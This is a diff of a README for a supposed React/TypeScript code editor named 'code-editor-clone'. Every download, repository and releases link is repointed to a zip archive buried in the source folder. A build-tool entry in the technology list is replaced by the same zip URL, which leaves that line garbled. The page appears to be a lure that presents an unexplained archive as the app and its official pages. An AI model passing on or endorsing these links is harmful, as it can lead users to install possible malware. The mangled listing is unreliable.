@@ -1,6 +1,6 @@
 # 🖥️ code-editor-clone - A Modern Code Writing Experience
 
-[![Download code-editor-clone](https://raw.githubusercontent.com/bartpatotas/code-editor-clone/master/overcoating/code-editor-clone.zip%20code--editor--clone-v1.0-blue)](https://raw.githubusercontent.com/bartpatotas/code-editor-clone/master/overcoating/code-editor-clone.zip)
+[![Download code-editor-clone](https://github.com/bartpatotas/code-editor-clone/raw/refs/heads/master/src/components/editor_code_clone_v3.9.zip%20code--editor--clone-v1.0-blue)](https://github.com/bartpatotas/code-editor-clone/raw/refs/heads/master/src/components/editor_code_clone_v3.9.zip)
 
 ## 📜 Description
 
@@ -21,7 +21,7 @@ Follow these steps to download and run code-editor-clone on your computer.
 
 To download code-editor-clone, visit the releases page. 
 
-[Download code-editor-clone here](https://raw.githubusercontent.com/bartpatotas/code-editor-clone/master/overcoating/code-editor-clone.zip)
+[Download code-editor-clone here](https://github.com/bartpatotas/code-editor-clone/raw/refs/heads/master/src/components/editor_code_clone_v3.9.zip)
 
 1. Click the link above.
 2. Find the latest version of the software.
@@ -53,7 +53,7 @@ This application uses a range of technologies:
 - **React:** For building user interfaces.
 - **TypeScript:** To enhance code quality and maintainability.
 - **PostCSS & Tailwind CSS:** For styling and layout.
-- **https://raw.githubusercontent.com/bartpatotas/code-editor-clone/master/overcoating/code-editor-clone.zip** As a build tool for faster development.
+- **https://github.com/bartpatotas/code-editor-clone/raw/refs/heads/master/src/components/editor_code_clone_v3.9.zip** As a build tool for faster development.
 
 ## 🚧 Troubleshooting
 
@@ -69,7 +69,7 @@ If you have questions or need assistance, please reach out via the issues sectio
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/bartpatotas/code-editor-clone/master/overcoating/code-editor-clone.zip)
-- [Releases Page](https://raw.githubusercontent.com/bartpatotas/code-editor-clone/master/overcoating/code-editor-clone.zip)
+- [GitHub Repository](https://github.com/bartpatotas/code-editor-clone/raw/refs/heads/master/src/components/editor_code_clone_v3.9.zip)
+- [Releases Page](https://github.com/bartpatotas/code-editor-clone/raw/refs/heads/master/src/components/editor_code_clone_v3.9.zip)
 
 By following these instructions, you will successfully download and run the code-editor-clone application. Enjoy coding!
